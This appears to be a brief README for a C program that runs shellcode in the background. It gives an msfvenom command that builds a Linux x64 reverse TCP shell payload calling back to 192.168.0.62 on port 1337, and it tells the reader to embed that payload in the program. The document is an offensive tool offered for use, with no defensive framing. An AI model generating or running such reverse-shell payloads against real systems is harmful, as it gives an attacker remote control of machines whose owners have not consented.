# background-shellcode
Execute a shellcode in background, coded in C.

Generate with msfvenom or use your shellcode:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.62 LPORT=1337 -f c
```
and add on code.
